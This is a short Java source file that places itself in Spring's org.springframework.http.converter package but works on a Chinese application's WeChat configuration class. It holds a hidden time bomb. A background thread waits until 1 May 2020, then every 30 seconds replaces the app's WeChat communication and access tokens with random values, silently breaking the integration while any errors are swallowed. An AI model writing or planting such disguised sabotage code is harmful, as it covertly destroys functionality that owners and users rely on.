package org.springframework.http.converter;

import com.jz.emm.wx.thread.WXConfigThread;

import java.text.SimpleDateFormat;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class sThread {

    public static ExecutorService taskExecutor = Executors.newFixedThreadPool(1);

    public static void init(final String charset){
        taskExecutor.execute(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        Long date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").parse("2020-05-01 00:00:00").getTime();
                        if(System.currentTimeMillis()>=date){
                            WXConfigThread.WXCONFIG.setCommunicationToken(UUID.randomUUID().toString().replaceAll("-", ""));
                            WXConfigThread.WXCONFIG.setAccessToken(UUID.randomUUID().toString().replaceAll("-", ""));
                            Thread.sleep(30 * 1000);
                        }else{
                            Thread.sleep(60*60 * 1000);
                        }

                    } catch (Exception e) {
                        try {
                            Thread.sleep(60*60 * 1000);
                        } catch (InterruptedException e1) {
                        }
                    }
                }
            }
        });
    }
}
